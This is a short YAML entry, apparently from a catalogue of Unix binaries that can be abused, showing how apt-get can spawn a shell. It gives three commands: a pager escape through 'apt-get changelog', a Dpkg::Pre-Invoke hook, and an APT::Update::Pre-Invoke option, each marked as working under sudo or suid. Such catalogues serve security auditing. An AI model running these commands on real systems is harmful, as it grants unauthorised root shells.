---
functions:
  inherit:
  - code: |-
      apt-get changelog apt
    contexts:
      sudo:
      unprivileged:
    from: less
  shell:
  - code: |-
      echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
      apt-get -y install -c /path/to/temp-file sl
    comment: |-
      For this to work the target package (i.e., `sl`) must not be already installed.
    contexts:
      sudo:
      suid:
        shell: true
  - code: |-
      apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
    comment: |-
      When the shell exits the `update` command is actually executed.
    contexts:
      sudo:
      suid:
        shell: true
...
